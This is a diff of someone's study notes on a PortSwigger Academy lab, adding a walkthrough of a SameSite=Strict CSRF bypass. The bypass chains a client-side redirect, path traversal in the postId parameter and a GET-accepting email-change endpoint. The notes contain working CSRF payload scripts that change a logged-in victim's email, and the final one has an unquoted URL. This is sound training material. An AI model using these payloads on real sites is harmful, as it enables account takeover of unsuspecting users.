@@ -379,4 +379,83 @@ python3 -m http.server <port-number>
     document.location = "https://0a1200a103990ed481024882008600cc.web-security-academy.net/my-account/change-email?email=test2%40test.ca&_method=POST";
 </script>
 ```
-![[Pasted image 20240924115940.png]]
+
+## 8. SameSite Strict bypass via client-side redirect
+##### Study the change email function
+1. In Burp's browser, log in to your own account and change your email address.
+2. In Burp, go to the **Proxy > HTTP history** tab.
+3. Study the `POST /my-account/change-email` request and notice that this doesn't contain any unpredictable tokens, so may be vulnerable to CSRF if you can bypass any [SameSite](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions) cookie restrictions.
+4. Look at the response to your `POST /login` request. Notice that the website explicitly specifies `SameSite=Strict` when setting session cookies. This prevents the browser from including these cookies in cross-site requests.
+
+##### Identify a suitable gadget
+1. In the browser, go to one of the blog posts and post an arbitrary comment. Observe that you're initially sent to a confirmation page at `/post/comment/confirmation?postId=x` but, after a few seconds, you're taken back to the blog post.
+2. In Burp, go to the proxy history and notice that this redirect is handled client-side using the imported JavaScript file `/resources/js/commentConfirmationRedirect.js`.
+3. Study the JavaScript and notice that this uses the `postId` query parameter to dynamically construct the path for the client-side redirect.
+4. In the proxy history, right-click on the `GET /post/comment/confirmation?postId=x` request and select **Copy URL**.
+5. In the browser, visit this URL, but change the `postId` parameter to an arbitrary string.
+    `/post/comment/confirmation?postId=foo`
+6. Observe that you initially see the post confirmation page before the client-side JavaScript attempts to redirect you to a path containing your injected string, for example, `/post/foo`.
+7. Try injecting a [path traversal](https://portswigger.net/web-security/file-path-traversal) sequence so that the dynamically constructed redirect URL will point to your account page:
+    `/post/comment/confirmation?postId=1/../../my-account`
+8. Observe that the browser normalizes this URL and successfully takes you to your account page. This confirms that you can use the `postId` parameter to elicit a `GET` request for an arbitrary endpoint on the target site.
+
+##### Bypass the SameSite restrictions
+1. In the browser, go to the exploit server and create a script that induces the viewer's browser to send the `GET` request you just tested. The following is one possible approach:
+    `<script> document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account"; </script>`
+2. Observe that when the client-side redirect takes place, you still end up on your logged-in account page. This confirms that the browser included your authenticated session cookie in the second request, even though the initial comment-submission request was initiated from an arbitrary external site.
+
+##### Craft an exploit
+1. Send the `POST /my-account/change-email` request to Burp Repeater.
+2. In Burp Repeater, right-click on the request and select **Change request method**. Burp automatically generates an equivalent `GET` request.
+3. Send the request. Observe that the endpoint allows you to change your email address using a `GET` request.
+4. Go back to the exploit server and change the `postId` parameter in your exploit so that the redirect causes the browser to send the equivalent `GET` request for changing your email address:
+    `<script> document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1"; </script>`
+    Note that you need to include the `submit` parameter and URL encode the ampersand delimiter to avoid breaking out of the `postId` parameter in the initial setup request.
+5. Test the exploit on yourself and confirm that you have successfully changed your email address.
+6. Change the email address in your exploit so that it doesn't match your own.
+
+ Analysis:
+- we observe that in the post request of login page we have set SameSite strict attribute
+	![[Pasted image 20240925011636.png]]
+	
+- we observe that in the post request of the change email we can change the request from POST to GET(which it means that this endpoint accepts also get request)
+	![[Pasted image 20240925011800.png]]
+- we have to bypass the SameSite strict by finding a redirecting element which method is trough GET (we will find a redirect in the comment section and the element is postID )
+	![[Pasted image 20240925012029.png]]
+	![[Pasted image 20240925011914.png]]![[Pasted image 20240925012201.png]]
+
+- payload0 (vulnerable redirecting element):
+```
+/post/comment/confirmation?postId=5
+```
+
+- payload1 (redirecting to my account in order to change email):
+```
+/post/comment/confirmation?postId=my-account/
+```
+
+- payload2 (page not found so we have to do a path traversal):
+```
+/post/comment/confirmation?postId=../my-account/
+```
+
+- payload3 (append the change email request):
+```
+post/comment/confirmation?postId=../my-account/change-email?email=paein%40web-security-academy.net&submit=1"
+```
+
+`/change-email?email=paein%40web-security-academy.net&submit=1"` is taken from the POST change email request page
+
+- payload4 (URL encode the value of the '&' which is %26):
+```
+post/comment/confirmation?postId=../my-account/change-email?email=paein%40web-security-academy.net%26submit=1" 
+```
+
+- final script payload (append the host https://HOST/POST)
+```
+<script>
+window.location=https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=paein%40web-security-academy.net%26submit=1" 
+</script>
+```
+
+## 9. SameSite Strict bypass via sibling domain
